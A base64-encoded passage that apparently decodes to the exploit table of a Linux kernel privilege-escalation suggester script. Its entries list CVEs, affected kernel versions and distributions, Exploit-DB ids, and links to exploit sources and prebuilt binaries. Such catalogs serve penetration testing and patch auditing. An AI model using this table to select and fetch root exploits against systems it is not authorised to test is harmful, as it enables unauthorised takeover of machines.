lcy90ZWFtLWVkd2FyZC5weQpleHBsb2l0LWRiOiAxMjEzMApjb21tZW50czogUmVxdWlyZXMgYSBSZWlzZXJGUyBmaWxlc3lzdGVtIG1vdW50ZWQgd2l0aCBleHRlbmRlZCBhdHRyaWJ1dGVzCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTAtMjk1OV0ke3R4dHJzdH0gY2FuX2JjbQpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjE4LHZlcjw9Mi42LjM2ClRhZ3M6IHVidW50dT0xMC4wNHtrZXJuZWw6Mi42LjMyLTI0LWdlbmVyaWN9ClJhbms6IDEKYmluLXVybDogaHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTYwNjAyMTkyNjQxL2h0dHBzOi8vd3d3Lmtlcm5lbC1leHBsb2l0cy5jb20vbWVkaWEvY2FuX2JjbQpleHBsb2l0LWRiOiAxNDgxNApFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDEwLTM5MDRdJHt0eHRyc3R9IHJkcwpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjMwLHZlcjwyLjYuMzcKVGFnczogZGViaWFuPTYuMHtrZXJuZWw6Mi42LigzMXwzMnwzNHwzNSktKDF8dHJ1bmspLWFtZDY0fSx1YnVudHU9MTAuMTB8OS4xMCxmZWRvcmE9MTN7a2VybmVsOjIuNi4zMy4zLTg1LmZjMTMuaTY4Ni5QQUV9LHVidW50dT0xMC4wNHtrZXJuZWw6Mi42LjMyLSgyMXwyNCktZ2VuZXJpY30KUmFuazogMQphbmFseXNpcy11cmw6IGh0dHA6Ly93d3cuc2VjdXJpdHlmb2N1cy5jb20vYXJjaGl2ZS8xLzUxNDM3OQpzcmMtdXJsOiBodHRwOi8vd2ViLmFyY2hpdmUub3JnL3dlYi8yMDEwMTAyMDA0NDA0OC9odHRwOi8vd3d3LnZzZWN1cml0eS5jb20vZG93bmxvYWQvdG9vbHMvbGludXgtcmRzLWV4cGxvaXQuYwpiaW4tdXJsOiBodHRwczovL3dlYi5hcmNoaXZlLm9yZy93ZWIvMjAxNjA2MDIxOTI2NDEvaHR0cHM6Ly93d3cua2VybmVsLWV4cGxvaXRzLmNvbS9tZWRpYS9yZHMKYmluLXVybDogaHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTYwNjAyMTkyNjQxL2h0dHBzOi8vd3d3Lmtlcm5lbC1leHBsb2l0cy5jb20vbWVkaWEvcmRzNjQKZXhwbG9pdC1kYjogMTUyODUKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxMC0zODQ4LENWRS0yMDEwLTM4NTAsQ1ZFLTIwMTAtNDA3M10ke3R4dHJzdH0gaGFsZl9uZWxzb24KUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4wLHZlcjw9Mi42LjM2ClRhZ3M6IHVidW50dT0oMTAuMDR8OS4xMCl7a2VybmVsOjIuNi4oMzF8MzIpLSgxNHwyMSktc2VydmVyfQpSYW5rOiAxCmJpbi11cmw6IGh0dHA6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTYwNjAyMTkyNjMxL2h0dHBzOi8vd3d3Lmtlcm5lbC1leHBsb2l0cy5jb20vbWVkaWEvaGFsZi1uZWxzb24zCmV4cGxvaXQtZGI6IDE3Nzg3CkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bTi9BXSR7dHh0cnN0fSBjYXBzX3RvX3Jvb3QKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4zNCx2ZXI8PTIuNi4zNix4ODYKVGFnczogdWJ1bnR1PTEwLjEwClJhbms6IDEKZXhwbG9pdC1kYjogMTU5MTYKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtOL0FdJHt0eHRyc3R9IGNhcHNfdG9fcm9vdCAyClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMzQsdmVyPD0yLjYuMzYKVGFnczogdWJ1bnR1PTEwLjEwClJhbms6IDEKZXhwbG9pdC1kYjogMTU5NDQKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxMC00MzQ3XSR7dHh0cnN0fSBhbWVyaWNhbi1zaWduLWxhbmd1YWdlClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMCx2ZXI8PTIuNi4zNgpUYWdzOgpSYW5rOiAxCmV4cGxvaXQtZGI6IDE1Nzc0CkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTAtMzQzN10ke3R4dHJzdH0gcGt0Y2R2ZApSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjAsdmVyPD0yLjYuMzYKVGFnczogdWJ1bnR1PTEwLjA0ClJhbms6IDEKZXhwbG9pdC1kYjogMTUxNTAKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxMC0zMDgxXSR7dHh0cnN0fSB2aWRlbzRsaW51eApSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjAsdmVyPD0yLjYuMzMKVGFnczogUkhFTD01ClJhbms6IDEKZXhwbG9pdC1kYjogMTUwMjQKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxMi0wMDU2XSR7dHh0cnN0fSBtZW1vZGlwcGVyClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0zLjAuMCx2ZXI8PTMuMS4wClRhZ3M6IHVidW50dT0oMTAuMDR8MTEuMTApe2tlcm5lbDozLjAuMC0xMi0oZ2VuZXJpY3xzZXJ2ZXIpfQpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXQuengyYzQuY29tL0NWRS0yMDEyLTAwNTYvYWJvdXQvCnNyYy11cmw6IGh0dHBzOi8vZ2l0Lnp4MmM0LmNvbS9DVkUtMjAxMi0wMDU2L3BsYWluL21lbXBvZGlwcGVyLmMKYmluLXVybDogaHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTYwNjAyMTkyNjMxL2h0dHBzOi8vd3d3Lmtlcm5lbC1leHBsb2l0cy5jb20vbWVkaWEvbWVtb2RpcHBlcgpiaW4tdXJsOiBodHRwczovL3dlYi5hcmNoaXZlLm9yZy93ZWIvMjAxNjA2MDIxOTI2MzEvaHR0cHM6Ly93d3cua2VybmVsLWV4cGxvaXRzLmNvbS9tZWRpYS9tZW1vZGlwcGVyNjQKZXhwbG9pdC1kYjogMTg0MTEKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxMi0wMDU2LENWRS0yMDEwLTM4NDksQ1ZFLTIwMTAtMzg1MF0ke3R4dHJzdH0gZnVsbC1uZWxzb24KUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4wLHZlcjw9Mi42LjM2ClRhZ3M6IHVidW50dT0oOS4xMHwxMC4xMCl7a2VybmVsOjIuNi4oMzF8MzUpLSgxNHwxOSktKHNlcnZlcnxnZW5lcmljKX0sdWJ1bnR1PTEwLjA0e2tlcm5lbDoyLjYuMzItKDIxfDI0KS1zZXJ2ZXJ9ClJhbms6IDEKc3JjLXVybDogaHR0cDovL3Z1bG5mYWN0b3J5Lm9yZy9leHBsb2l0cy9mdWxsLW5lbHNvbi5jCmJpbi11cmw6IGh0dHBzOi8vd2ViLmFyY2hpdmUub3JnL3dlYi8yMDE2MDYwMjE5MjYzMS9odHRwczovL3d3dy5rZXJuZWwtZXhwbG9pdHMuY29tL21lZGlhL2Z1bGwtbmVsc29uCmJpbi11cmw6IGh0dHBzOi8vd2ViLmFyY2hpdmUub3JnL3dlYi8yMDE2MDYwMjE5MjYzMS9odHRwczovL3d3dy5rZXJuZWwtZXhwbG9pdHMuY29tL21lZGlhL2Z1bGwtbmVsc29uNjQKZXhwbG9pdC1kYjogMTU3MDQKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxMy0xODU4XSR7dHh0cnN0fSBDTE9ORV9ORVdVU0VSfENMT05FX0ZTClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPTMuOCxDT05GSUdfVVNFUl9OUz15ClRhZ3M6IApSYW5rOiAxCnNyYy11cmw6IGh0dHA6Ly9zdGVhbHRoLm9wZW53YWxsLm5ldC94U3BvcnRzL2Nsb3duLW5ld3VzZXIuYwphbmFseXNpcy11cmw6IGh0dHBzOi8vbHduLm5ldC9BcnRpY2xlcy81NDMyNzMvCmV4cGxvaXQtZGI6IDM4MzkwCmF1dGhvcjogU2ViYXN0aWFuIEtyYWhtZXIKQ29tbWVudHM6IENPTkZJR19VU0VSX05TIG5lZWRzIHRvIGJlIGVuYWJsZWQgCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTMtMjA5NF0ke3R4dHJzdH0gcGVyZl9zd2V2ZW50ClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMzIsdmVyPDMuOC45LHg4Nl82NApUYWdzOiBSSEVMPTYsdWJ1bnR1PTEyLjA0e2tlcm5lbDozLjIuMC0oMjN8MjkpLWdlbmVyaWN9LGZlZG9yYT0xNntrZXJuZWw6My4xLjAtNy5mYzE2Lng4Nl82NH0sZmVkb3JhPTE3e2tlcm5lbDozLjMuNC01LmZjMTcueDg2XzY0fSxkZWJpYW49N3trZXJuZWw6My4yLjAtNC1hbWQ2NH0KUmFuazogMQphbmFseXNpcy11cmw6IGh0dHA6Ly90aW1ldG9ibGVlZC5jb20vYS1jbG9zZXItbG9vay1hdC1hLXJlY2VudC1wcml2aWxlZ2UtZXNjYWxhdGlvbi1idWctaW4tbGludXgtY3ZlLTIwMTMtMjA5NC8KYmluLXVybDogaHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTYwNjAyMTkyNjMxL2h0dHBzOi8vd3d3Lmtlcm5lbC1leHBsb2l0cy5jb20vbWVkaWEvcGVyZl9zd2V2ZW50CmJpbi11cmw6IGh0dHBzOi8vd2ViLmFyY2hpdmUub3JnL3dlYi8yMDE2MDYwMjE5MjYzMS9odHRwczovL3d3dy5rZXJuZWwtZXhwbG9pdHMuY29tL21lZGlhL3BlcmZfc3dldmVudDY0CmV4cGxvaXQtZGI6IDI2MTMxCmF1dGhvcjogQW5kcmVhICdzb3JibycgQml0dGF1CkNvbW1lbnRzOiBObyBTTUVQL1NNQVAgYnlwYXNzCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTMtMjA5NF0ke3R4dHJzdH0gcGVyZl9zd2V2ZW50IDIKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4zMix2ZXI8My44LjkseDg2XzY0ClRhZ3M6IHVidW50dT0xMi4wNHtrZXJuZWw6My4oMnw1KS4wLSgyM3wyOSktZ2VuZXJpY30KUmFuazogMQphbmFseXNpcy11cmw6IGh0dHA6Ly90aW1ldG9ibGVlZC5jb20vYS1jbG9zZXItbG9vay1hdC1hLXJlY2VudC1wcml2aWxlZ2UtZXNjYWxhdGlvbi1idWctaW4tbGludXgtY3ZlLTIwMTMtMjA5NC8Kc3JjLXVybDogaHR0cHM6Ly9jeXNlY2xhYnMuY29tL2V4cGxvaXRzL3ZuaWtfdjEuYwpleHBsb2l0LWRiOiAzMzU4OQphdXRob3I6IFZpdGFseSAndm5paycgTmlrb2xlbmtvCkNvbW1lbnRzOiBObyBTTUVQL1NNQVAgYnlwYXNzCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTMtMDI2OF0ke3R4dHJzdH0gbXNyClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMTgsdmVyPDMuNy42ClRhZ3M6IApSYW5rOiAxCmV4cGxvaXQtZGI6IDI3Mjk3CkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTMtMTk1OV0ke3R4dHJzdH0gdXNlcm5zX3Jvb3Rfc3Bsb2l0ClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0zLjAuMSx2ZXI8My44LjkKVGFnczogClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwOi8vd3d3Lm9wZW53YWxsLmNvbS9saXN0cy9vc3Mtc2VjdXJpdHkvMjAxMy8wNC8yOS8xCmV4cGxvaXQtZGI6IDI1NDUwCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTMtMjA5NF0ke3R4dHJzdH0gc2VtdGV4ClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMzIsdmVyPDMuOC45ClRhZ3M6IFJIRUw9NgpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cDovL3RpbWV0b2JsZWVkLmNvbS9hLWNsb3Nlci1sb29rLWF0LWEtcmVjZW50LXByaXZpbGVnZS1lc2NhbGF0aW9uLWJ1Zy1pbi1saW51eC1jdmUtMjAxMy0yMDk0LwpleHBsb2l0LWRiOiAyNTQ0NApFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE0LTAwMzhdJHt0eHRyc3R9IHRpbWVvdXRwd24KUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTMuNC4wLHZlcjw9My4xMy4xLENPTkZJR19YODZfWDMyPXkKVGFnczogdWJ1bnR1PTEzLjEwClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwOi8vYmxvZy5pbmNsdWRlc2VjdXJpdHkuY29tLzIwMTQvMDMvZXhwbG9pdC1DVkUtMjAxNC0wMDM4LXgzMi1yZWN2bW1zZy1rZXJuZWwtdnVsbmVyYWJsaXR5Lmh0bWwKYmluLXVybDogaHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTYwNjAyMTkyNjMxL2h0dHBzOi8vd3d3Lmtlcm5lbC1leHBsb2l0cy5jb20vbWVkaWEvdGltZW91dHB3bjY0CmV4cGxvaXQtZGI6IDMxMzQ2CkNvbW1lbnRzOiBDT05GSUdfWDg2X1gzMiBuZWVkcyB0byBiZSBlbmFibGVkCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTQtMDAzOF0ke3R4dHJzdH0gdGltZW91dHB3biAyClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0zLjQuMCx2ZXI8PTMuMTMuMSxDT05GSUdfWDg2X1gzMj15ClRhZ3M6IHVidW50dT0oMTMuMDR8MTMuMTApe2tlcm5lbDozLig4fDExKS4wLSgxMnwxNXwxOSktZ2VuZXJpY30KUmFuazogMQphbmFseXNpcy11cmw6IGh0dHA6Ly9ibG9nLmluY2x1ZGVzZWN1cml0eS5jb20vMjAxNC8wMy9leHBsb2l0LUNWRS0yMDE0LTAwMzgteDMyLXJlY3ZtbXNnLWtlcm5lbC12dWxuZXJhYmxpdHkuaHRtbApleHBsb2l0LWRiOiAzMTM0NwpDb21tZW50czogQ09ORklHX1g4Nl9YMzIgbmVlZHMgdG8gYmUgZW5hYmxlZApFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE0LTAxOTZdJHt0eHRyc3R9IHJhd21vZGVQVFkKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4zMSx2ZXI8PTMuMTQuMwpUYWdzOgpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cDovL2Jsb2cuaW5jbHVkZXNlY3VyaXR5LmNvbS8yMDE0LzA2L2V4cGxvaXQtd2Fsa3Rocm91Z2gtY3ZlLTIwMTQtMDE5Ni1wdHkta2VybmVsLXJhY2UtY29uZGl0aW9uLmh0bWwKZXhwbG9pdC1kYjogMzM1MTYKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNC0yODUxXSR7dHh0cnN0fSB1c2UtYWZ0ZXItZnJlZSBpbiBwaW5nX2luaXRfc29jaygpICR7YmxkYmx1fShEb1MpJHt0eHRyc3R9ClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0zLjAuMSx2ZXI8PTMuMTQKVGFnczogClJhbms6IDAKYW5hbHlzaXMtdXJsOiBodHRwczovL2N5c2VjbGFicy5jb20vcGFnZT9uPTAyMDEyMDE2CmV4cGxvaXQtZGI6IDMyOTI2CkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTQtNDAxNF0ke3R4dHJzdH0gaW5vZGVfY2FwYWJsZQpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49My4wLjEsdmVyPD0zLjEzClRhZ3M6IHVidW50dT0xMi4wNApSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cDovL3d3dy5vcGVud2FsbC5jb20vbGlzdHMvb3NzLXNlY3VyaXR5LzIwMTQvMDYvMTAvNApleHBsb2l0LWRiOiAzMzgyNApFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE0LTQ2OTldJHt0eHRyc3R9IHB0cmFjZS9zeXNyZXQKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTMuMC4xLHZlcjw9My44ClRhZ3M6IHVidW50dT0xMi4wNApSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cDovL3d3dy5vcGVud2FsbC5jb20vbGlzdHMvb3NzLXNlY3VyaXR5LzIwMTQvMDcvMDgvMTYKZXhwbG9pdC1kYjogMzQxMzQKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNC00OTQzXSR7dHh0cnN0fSBQUFBvTDJUUCAke2JsZGJsdX0oRG9TKSR7dHh0cnN0fQpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49My4yLHZlcjw9My4xNS42ClRhZ3M6IApSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9jeXNlY2xhYnMuY29tL3BhZ2U/bj0wMTEwMjAxNQpleHBsb2l0LWRiOiAzNjI2NwpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE0LTUyMDddJHt0eHRyc3R9IGZ1c2Vfc3VpZApSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49My4wLjEsdmVyPD0zLjE2LjEKVGFnczogClJhbms6IDEKZXhwbG9pdC1kYjogMzQ5MjMKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNS05MzIyXSR7dHh0cnN0fSBCYWRJUkVUClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0zLjAuMSx2ZXI8My4xNy41LHg4Nl82NApUYWdzOiBSSEVMPD03LGZlZG9yYT0yMApSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cDovL2xhYnMuYnJvbWl1bS5jb20vMjAxNS8wMi8wMi9leHBsb2l0aW5nLWJhZGlyZXQtdnVsbmVyYWJpbGl0eS1jdmUtMjAxNC05MzIyLWxpbnV4LWtlcm5lbC1wcml2aWxlZ2UtZXNjYWxhdGlvbi8Kc3JjLXVybDogaHR0cDovL3NpdGUucGkzLmNvbS5wbC9leHAvcF9jdmUtMjAxNC05MzIyLnRhci5negpleHBsb2l0LWRiOgphdXRob3I6IFJhZmFsICduM3JnYWwnIFdvanRjenVrICYgQWRhbSAncGkzJyBaYWJyb2NraQpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE1LTMyOTBdJHt0eHRyc3R9IGVzcGZpeDY0X05NSQpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49My4xMyx2ZXI8NC4xLjYseDg2XzY0ClRhZ3M6IApSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cDovL3d3dy5vcGVud2FsbC5jb20vbGlzdHMvb3NzLXNlY3VyaXR5LzIwMTUvMDgvMDQvOApleHBsb2l0LWRiOiAzNzcyMgpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W04vQV0ke3R4dHJzdH0gYmx1ZXRvb3RoClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPD0yLjYuMTEKVGFnczoKUmFuazogMQpleHBsb2l0LWRiOiA0NzU2CkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTUtMTMyOF0ke3R4dHJzdH0gb3ZlcmxheWZzClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0zLjEzLjAsdmVyPD0zLjE5LjAKVGFnczogdWJ1bnR1PSgxMi4wNHwxNC4wNCl7a2VybmVsOjMuMTMuMC0oMnwzfDR8NSkqLWdlbmVyaWN9LHVidW50dT0oMTQuMTB8MTUuMDQpe2tlcm5lbDozLigxM3wxNikuMC0qLWdlbmVyaWN9ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwOi8vc2VjbGlzdHMub3JnL29zcy1zZWMvMjAxNS9xMi83MTcKYmluLXVybDogaHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTYwNjAyMTkyNjMxL2h0dHBzOi8vd3d3Lmtlcm5lbC1leHBsb2l0cy5jb20vbWVkaWEvb2ZzXzMyCmJpbi11cmw6IGh0dHBzOi8vd2ViLmFyY2hpdmUub3JnL3dlYi8yMDE2MDYwMjE5MjYzMS9odHRwczovL3d3dy5rZXJuZWwtZXhwbG9pdHMuY29tL21lZGlhL29mc182NApleHBsb2l0LWRiOiAzNzI5MgpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE1LTg2NjBdJHt0eHRyc3R9IG92ZXJsYXlmcyAob3ZsX3NldGF0dHIpClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0zLjAuMCx2ZXI8PTQuMy4zClRhZ3M6ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwOi8vd3d3LmhhbGZkb2cubmV0L1NlY3VyaXR5LzIwMTUvVXNlck5hbWVzcGFjZU92ZXJsYXlmc1NldHVpZFdyaXRlRXhlYy8KZXhwbG9pdC1kYjogMzkyMzAKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNS04NjYwXSR7dHh0cnN0fSBvdmVybGF5ZnMgKG92bF9zZXRhdHRyKQpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49My4wLjAsdmVyPD00LjMuMwpUYWdzOiB1YnVudHU9KDE0LjA0fDE1LjEwKXtrZXJuZWw6NC4yLjAtKDE4fDE5fDIwfDIxfDIyKS1nZW5lcmljfQpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cDovL3d3dy5oYWxmZG9nLm5ldC9TZWN1cml0eS8yMDE1L1VzZXJOYW1lc3BhY2VPdmVybGF5ZnNTZXR1aWRXcml0ZUV4ZWMvCmV4cGxvaXQtZGI6IDM5MTY2CkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTYtMDcyOF0ke3R4dHJzdH0ga2V5cmluZwpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49My4xMCx2ZXI8NC40LjEKVGFnczoKUmFuazogMAphbmFseXNpcy11cmw6IGh0dHA6Ly9wZXJjZXB0aW9uLXBvaW50LmlvLzIwMTYvMDEvMTQvYW5hbHlzaXMtYW5kLWV4cGxvaXRhdGlvbi1vZi1hLWxpbnV4LWtlcm5lbC12dWxuZXJhYmlsaXR5LWN2ZS0yMDE2LTA3MjgvCmV4cGxvaXQtZGI6IDQwMDAzCkNvbW1lbnRzOiBFeHBsb2l0IHRha2VzIGFib3V0IH4zMCBtaW51dGVzIHRvIHJ1bi4gRXhwbG9pdCBpcyBub3QgcmVsaWFibGUsIHNlZTogaHR0cHM6Ly9jeXNlY2xhYnMuY29tL2Jsb2cvY3ZlLTIwMTYtMDcyOC1wb2Mtbm90LXdvcmtpbmcKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNi0yMzg0XSR7dHh0cnN0fSB1c2ItbWlkaQpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49My4wLjAsdmVyPD00LjQuOApUYWdzOiB1YnVudHU9MTQuMDQsZmVkb3JhPTIyClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL3hhaXJ5LmdpdGh1Yi5pby9ibG9nLzIwMTYvY3ZlLTIwMTYtMjM4NApzcmMtdXJsOiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veGFpcnkva2VybmVsLWV4cGxvaXRzL21hc3Rlci9DVkUtMjAxNi0yMzg0L3BvYy5jCmV4cGxvaXQtZGI6IDQxOTk5CkNvbW1lbnRzOiBSZXF1aXJlcyBhYmlsaXR5IHRvIHBsdWcgaW4gYSBtYWxpY2lvdXMgVVNCIGRldmljZSBhbmQgdG8gZXhlY3V0ZSBhIG1hbGljaW91cyBiaW5hcnkgYXMgYSBub24tcHJpdmlsZWdlZCB1c2VyCmF1dGhvcjogQW5kcmV5ICd4YWlyeScgS29ub3ZhbG92CkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTYtNDk5N10ke3R4dHJzdH0gdGFyZ2V0X29mZnNldApSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49NC40LjAsdmVyPD00LjQuMCxjbWQ6Z3JlcCAtcWkgaXBfdGFibGVzIC9wcm9jL21vZHVsZXMKVGFnczogdWJ1bnR1PTE2LjA0e2tlcm5lbDo0LjQuMC0yMS1nZW5lcmljfQpSYW5rOiAxCnNyYy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9vZmZlbnNpdmUtc2VjdXJpdHkvZXhwbG9pdC1kYXRhYmFzZS1iaW4tc3Bsb2l0cy9yYXcvbWFzdGVyL2Jpbi1zcGxvaXRzLzQwMDUzLnppcApDb21tZW50czogaXBfdGFibGVzLmtvIG5lZWRzIHRvIGJlIGxvYWRlZApleHBsb2l0LWRiOiA0MDA0OQphdXRob3I6IFZpdGFseSAndm5paycgTmlrb2xlbmtvCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTYtNDU1N10ke3R4dHJzdH0gZG91YmxlLWZkcHV0KCkKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTQuNCx2ZXI8NC41LjUsQ09ORklHX0JQRl9TWVNDQUxMPXksc3lzY3RsOmtlcm5lbC51bnByaXZpbGVnZWRfYnBmX2Rpc2FibGVkIT0xClRhZ3M6IHVidW50dT0xNi4wNHtrZXJuZWw6NC40LjAtMjEtZ2VuZXJpY30KUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vYnVncy5jaHJvbWl1bS5vcmcvcC9wcm9qZWN0LXplcm8vaXNzdWVzL2RldGFpbD9pZD04MDgKc3JjLXVybDogaHR0cHM6Ly9naXRodWIuY29tL29mZmVuc2l2ZS1zZWN1cml0eS9leHBsb2l0LWRhdGFiYXNlLWJpbi1zcGxvaXRzL3Jhdy9tYXN0ZXIvYmluLXNwbG9pdHMvMzk3NzIuemlwCkNvbW1lbnRzOiBDT05GSUdfQlBGX1NZU0NBTEwgbmVlZHMgdG8gYmUgc2V0ICYmIGtlcm5lbC51bnByaXZpbGVnZWRfYnBmX2Rpc2FibGVkICE9IDEKZXhwbG9pdC1kYjogNDA3NTkKYXV0aG9yOiBKYW5uIEhvcm4KRU9GCikKCkVYUExPSVRTWygobisrKSldPSQo